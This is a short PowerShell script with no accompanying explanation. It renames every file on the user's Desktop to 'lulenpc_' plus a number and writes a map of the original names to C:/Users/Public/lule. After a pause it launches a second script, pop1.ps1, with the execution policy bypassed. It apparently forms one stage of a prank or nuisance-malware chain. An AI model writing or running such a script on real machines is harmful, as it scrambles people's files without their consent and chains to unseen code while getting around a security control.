# Define paths
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'))
$public = 'C:/Users/Public'
$backupFilePath = [System.IO.Path]::Combine($public, "lule/name_backup.txt")

# Rename files to lulenpc
$files = Get-ChildItem -Path $desktopPath -File
$counter = 1

# Create or clear the backup file
if (Test-Path -Path $backupFilePath) {
    Clear-Content -Path $backupFilePath
} else {
    New-Item -Path $backupFilePath -ItemType File
}

foreach ($file in $files) {
    $originalName = $file.Name
    $newName = "lulenpc_$counter$($file.Extension)"
    $counter++

    # Write original and new names to backup file
    Add-Content -Path $backupFilePath -Value "$originalName`|$newName"

    # Rename the file
    Rename-Item -Path $file.FullName -NewName $newName
}

timeout /t 15 /nobreak > nul
cd C:/Users/Public/lule
Start-Process -NoNewWindow -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass .\pop1.ps1"
